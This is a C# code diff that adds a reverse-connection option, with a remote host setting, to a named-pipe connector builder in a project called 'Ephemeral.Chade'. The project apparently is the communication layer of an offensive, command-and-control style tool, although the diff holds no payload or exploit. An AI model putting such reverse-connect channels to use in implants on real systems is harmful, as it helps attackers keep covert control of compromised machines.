@@ -11,7 +11,8 @@ namespace Ephemeral.Chade.Communication.NamedPipes
 {
     public enum NamedPipeConnectorType
     {
-        Bind
+        Bind,
+        Reverse
     }
 
     public class NamedPipeConnectorBuilder
@@ -32,15 +33,19 @@ namespace Ephemeral.Chade.Communication.NamedPipes
 
         public NamedPipeConnectorType Type { get; private set; }
 
+        public string RemoteHost { get; private set; }
+
         public NamedPipeConnectorBuilder()
         {
             this.Name = "Ephemeral.Chade";
+            this.RemoteHost = ".";
             this.OpenMode = (uint)PipeOpenModeFlags.PIPE_ACCESS_DUPLEX;
             this.Mode = (uint)PipeModeFlags.PIPE_TYPE_BYTE | (uint)PipeModeFlags.PIPE_WAIT;
             this.InBufferSize = 1024;
             this.OutBufferSize = 1024;
             this.NullDACL = false;
             this.NullLogonSessions = false;
+            this.Type = NamedPipeConnectorType.Bind;
         }
 
         #region Setters
@@ -109,11 +114,38 @@ namespace Ephemeral.Chade.Communication.NamedPipes
             return this;
         }
 
+        public NamedPipeConnectorBuilder SetType(NamedPipeConnectorType type)
+        {
+            this.Type = type;
+            return this;
+        }
+
+        public NamedPipeConnectorBuilder UseReverseConnector()
+        {
+            return this.SetType(NamedPipeConnectorType.Reverse);
+        }
+        public NamedPipeConnectorBuilder UseBindConnector()
+        {
+            return this.SetType(NamedPipeConnectorType.Bind);
+        }
+
+        public NamedPipeConnectorBuilder SetRemoteHost(string host)
+        {
+            this.RemoteHost = host;
+            return this;
+        }
+
         #endregion
 
 
         public IConnector Build()
         {
+
+            if(this.Type == NamedPipeConnectorType.Reverse)
+            {
+                return new NamedPipeReverseConnector(this.Name, this.RemoteHost, this.InBufferSize, this.OutBufferSize, this.OpenMode, this.Mode);
+            }
+
             var pipeName = $"\\\\.\\pipe\\{this.Name}";
 
             IntPtr pSecAttr = IntPtr.Zero;
